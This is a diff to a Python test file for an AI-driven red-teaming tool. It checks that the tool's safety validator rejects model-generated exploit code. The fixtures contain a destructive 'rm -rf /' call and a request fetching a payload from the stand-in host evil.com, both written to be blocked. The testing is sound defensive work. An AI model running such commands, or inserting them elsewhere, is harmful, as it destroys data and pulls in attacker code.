@@ -25,14 +25,11 @@ import os
 def test_exploit():
     os.system("rm -rf /")
 """
-    success, detail = red_teamer.attempt_exploit(finding, "def foo(): pass", Path("app.py"))
-    # The static check should prevent execution because 'os' is not in the allowed imports list
-    # Wait, we mock _query_gemini to return the unsafe code
     red_teamer._query_gemini = lambda prompt: unsafe_code
     success, detail = red_teamer.attempt_exploit(finding, "def foo(): pass", Path("app.py"))
     assert success is False
     assert "Unsafe exploit code" in detail
-    assert "disallowed import 'os'" in detail
+    assert "disallowed execution call 'os.system'" in detail
 
 
 def test_agentic_red_teamer_ast_safety_eval() -> None:
@@ -57,6 +54,30 @@ def test_exploit():
     assert success is False
     assert "Unsafe exploit code" in detail
     assert "dangerous builtin call 'eval'" in detail
+
+
+def test_agentic_red_teamer_outbound_blocked() -> None:
+    red_teamer = AgenticRedTeamer()
+    finding = Finding(
+        vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
+        severity=Severity.HIGH,
+        confidence_score=0.9,
+        recommendation="Fix it",
+        file_path="app.py",
+        line_number=10,
+    )
+
+    # Test requests to external host
+    unsafe_code = """
+import requests
+def test_exploit():
+    requests.get("https://evil.com/payload")
+"""
+    red_teamer._query_gemini = lambda prompt: unsafe_code
+    success, detail = red_teamer.attempt_exploit(finding, "def foo(): pass", Path("app.py"))
+    assert success is False
+    assert "Unsafe exploit code" in detail
+    assert "outbound connection to 'https://evil.com/payload' is disallowed" in detail
 
 
 def test_secret_rotator_workspace_validation(tmp_path: Path) -> None:
